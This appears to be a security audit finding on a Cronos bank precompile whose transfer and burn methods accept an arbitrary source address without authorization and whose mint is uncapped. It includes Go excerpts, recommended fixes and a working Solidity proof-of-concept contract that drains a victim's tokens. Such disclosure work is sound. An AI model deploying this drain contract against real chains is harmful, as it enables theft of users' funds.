### Title
Bank Precompile `transfer` Allows Any EVM Contract to Move Native Cosmos Tokens From Arbitrary Addresses Without Authorization - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract` precompile at address `0x0000000000000000000000000000000000000064` exposes `mint`, `burn`, and `transfer` methods that derive the token denom from `contract.Caller()` but accept the **source address** as a caller-supplied argument with no authorization check. Any unprivileged EVM contract can therefore mint unlimited `evm/<contract>` native Cosmos tokens to arbitrary addresses, transfer those tokens from any holder without consent, and burn them from any holder without consent.

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch reads the `sender` address directly from ABI-decoded input:

```go
sender := args[0].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
...
denom := EVMDenom(contract.Caller())          // evm/0x<callerContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, ...)   // from = caller-supplied sender
```

There is no check that `sender == contract.Caller()` and no approval/allowance mechanism. The precompile unconditionally calls `bankKeeper.SendCoins` with whatever address the calling contract supplies as `sender`.

The same pattern applies to `BurnMethodName`: the address to burn from (`recipient` in the variable name, but used as the debit account) is also caller-supplied with no authorization check:

```go
recipient := args[0].(common.Address)
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

Additionally, `MintMethodName` has no supply cap: any contract can call `mint(anyAddress, unlimitedAmount)` and create unbounded `evm/<contract>` native tokens, directly analogous to the unchecked `ownerMint` in the external report.

### Impact Explanation

`evm/<contract>` tokens are real Cosmos `sdk.Coin` entries managed by `x/bank`. They can be:
- Sent via IBC (`MsgTransferTokens`)
- Used as collateral in Cosmos-native DeFi
- Converted back to CRC21 via `ConvertVouchersToEvmCoins`

A malicious contract can:
1. Call `mint(victimAddress, N)` → victim now holds `evm/0xAttacker` native tokens
2. Call `transfer(victimAddress, attackerAddress, N)` → drains victim's balance with zero consent

Or, for a contract that legitimate users have already interacted with (receiving `evm/0xContract` tokens via `moveToNative`), the contract owner can later call `transfer(anyUser, attacker, balance)` to drain all holders silently.

This is an **unauthorized transfer and mint of native Cosmos tokens** — Critical impact under the allowed scope.

### Likelihood Explanation

The precompile is live and callable by any deployed EVM contract. No special role, leaked key, or governance action is required. Any user who can deploy a contract (i.e., every unprivileged user) can reach this path. The `TestBank.sol` integration test confirms the precompile is actively used in production flows.

### Recommendation

1. **`transfer`**: Enforce `sender == contract.Caller()`. If delegated transfers are needed, add an on-chain allowance mapping (analogous to ERC-20 `approve`/`transferFrom`).
2. **`burn`**: Enforce `recipient == contract.Caller()` so a contract can only burn tokens it holds, not tokens held by arbitrary addresses.
3. **`mint`**: Introduce a per-denom supply cap stored in the precompile or enforce that the caller is a registered token-mapping contract before minting.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankDrain {
    IBank constant bank = IBank(0x0000000000000000000000000000000000000064);

    // Step 1: seed victim with evm/0xBankDrain tokens (no victim consent needed)
    function seed(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/0xBankDrain balance to attacker
    // No approval from victim required
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

After deploying `BankDrain` at address `X`:
- `seed(victim, 1e18)` → victim's Cosmos bank balance gains `1000000000000000000 evm/0xX`
- `drain(victim, attacker, 1e18)` → those tokens move to attacker with no victim signature
